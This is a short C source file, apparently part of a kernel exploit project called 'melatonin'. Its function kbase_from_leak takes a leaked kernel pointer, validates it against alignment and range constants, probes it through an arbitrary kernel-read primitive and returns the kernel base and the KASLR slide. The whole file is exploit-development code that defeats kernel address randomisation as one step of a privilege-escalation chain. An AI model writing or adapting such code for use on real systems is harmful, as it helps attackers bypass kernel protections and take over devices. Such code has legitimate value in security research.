#include "melatonin.h"
#include "offsets.h"

struct mela_ctx g_mela;

int kbase_from_leak(uint64_t leak, uint64_t *base, uint64_t *slide) {
    if (!leak) return -1;

    uint64_t va = mela_canon(leak);
    if (va < MELA_KERN_MIN || va >= MELA_KERN_MAX) return -1;

    uint64_t b = va & ~(MELA_KV_ALIGN - 1);
    if (b != va) return -1;              /* text is 2MB aligned */

    uint64_t s = b - OFF_KERNEL_BASE;
    if (s & (MELA_KV_ALIGN - 1)) return -1;
    if (s > 0x40000000ULL) return -1;

    char page[4];
    if (kread(b, page, sizeof page) != 0) return -1;   /* probed */

    *base  = b;
    *slide = s;
    return 0;
}
